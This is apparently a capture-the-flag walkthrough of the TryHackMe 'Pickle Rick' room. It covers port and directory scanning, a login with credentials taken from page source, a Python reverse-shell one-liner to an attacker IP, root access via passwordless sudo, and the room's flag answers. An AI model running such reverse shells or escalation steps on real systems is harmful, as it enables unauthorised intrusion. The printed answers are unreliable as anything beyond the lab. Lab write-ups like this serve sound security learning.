# Pickle Rick

A Rick and Morty CTF. Help turn Rick back into a human!

Room link: https://tryhackme.com/room/picklerick
Difficulty: **Easy**

### Walkthrough

Running an initial Nmap scan against all ports shows both port 22 (SSH) and 80 (HTTP) are open:

```console
$ nmap -p- -T4 10.10.76.19 -oN scans/initial.nmap   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 09:09 GMT
Nmap scan report for 10.10.76.19
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.99 seconds
```

Running a full scan against these ports show Apache version `2.4.18` is running on an Ubuntu sytem:

```console
$ nmap -p 22,80 -A -T4 10.10.76.19 -oN scans/open_ports.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 09:13 GMT
Nmap scan report for 10.10.76.19
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:83:cb:9c:49:59:9e:8f:2d:41:f6:9f:df:40:84:32 (RSA)
|   256 1d:2b:0f:3a:92:c0:32:3a:74:c3:24:2a:88:0f:0f:ee (ECDSA)
|_  256 74:e8:31:f4:b4:0d:48:5b:87:60:4f:64:54:9b:f2:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   28.70 ms 10.9.0.1
2   29.23 ms 10.10.76.19

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```

Navigating to the website shows the following homepage which states Rick has forgotten his password and his three secret ingredients for his pickle-reverse potion:

![Pickle Rick - Homepage](picklerick_homepage.png)

Reviewing the source code reveals the username is `R1ckRul3s`

![Pickle Rick - Sourcecode](picklerick_sourcecode.png)

Checking `/robots.txt` shows the following text:

```
Wubbalubbadubdub
```

Running `gobuster` with a medium-length dictionary list does not reveal any hidden paths:

```console
$ gobuster dir -u http://10.10.76.19/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.76.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/25 09:18:45 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 311] [--> http://10.10.76.19/assets/]
/server-status        (Status: 403) [Size: 299]
Progress: 220444 / 220561 (99.95%)
===============================================================
2023/11/25 09:30:37 Finished
===============================================================
```

Nikto scan identifies a `login.php` page:

```console
$ nikto -h 10.10.76.19               
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.76.19
+ Target Hostname:    10.10.76.19
+ Target Port:        80
+ Start Time:         2023-11-25 09:32:09 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-11-25 09:37:40 (GMT0) (331 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Navigating to this page shows a simple login form:

![Pickle Rick - Login](picklerick_login_php.png)

Using the username and string from `robots.txt` as the credentials (`R1ckRul3s:Wubbalubbadubdub`) allows us to successfully log in. At which point, we are presented with a command panel, allowing us to interact with the host via built-in commands:

![Pickle Rick - Portal](picklerick_portal.png)

For example, running `ls` returns the directory listing:

![Pickle Rick - ls](picklerick_ls.png)

However, attempting to run `cat` against the files results in the following error:

![Pickle Rick - Command Disabled](picklerick_command_disabled.png)

Fortunately, the `less` command is not denied, allowing us to read the first ingredient:

![Pickle Rick - Less](picklerick_less_ingred1.png)

```
mr. meeseek hair
```

Viewing `clue.txt` indicates we can look through the filesystem for the other ingredient:

![Pickle Rick - Clue](picklerick_clue.png)

First, let's get a shell on the host so that we can navigate through the filesystem easier. We can use a Python one-liner from [PentestMonkey's Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), modifying it with our attacker IP and chosen listen port:

![Pickle Rick - Which Python3](picklerick_which_python3.png)

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This results in a successful callback to our attacker machine:

![Pickle Rick - Callback](picklerick_callback.png)

Stabilising the shell with the following commands:

```console
$ python3 -c "import pty; pty.spawn('/bin/bash')"
$ export TERM=xterm
```

Looking around the filesystem, we identify the `rick` user in `/home`:

![Pickle Rick - Rick User](picklerick_rick_user.png)

Within their `/home` directory, there is a `second ingredients` file which we can read:

![Pickle Rick - Ingredient](picklerick_ingredient2.png)

```
1 jerry tear
```

Now we must escalate our privileges in order to find the 3rd and final ingredient. To do this, we can run `sudo -l` to see if there are any privileges granted to the `www-data` user


![Pickle Rick - Sudo -l](picklerick_sudo_l.png)

From the above, we can see that the user can run any `sudo` command without requiring password authentication. This means we can simply run `sudo su` to switch to the `root` user:

```console
$ sudo su
```

![Pickle Rick - Privesc](picklerick_privesc.png)

Finally, we can read the third ingredient:

![Pickle Rick - Ingredient 3](picklerick_ingredient3.png)

```
fleeb juice
```

-----

1. What is the first ingredient that Rick needs?

```
mr. meeseek hair
```

2. What is the second ingredient in Rick’s potion?

```
1 jerry tear
```

3. What is the last and final ingredient?

```
fleeb juice
```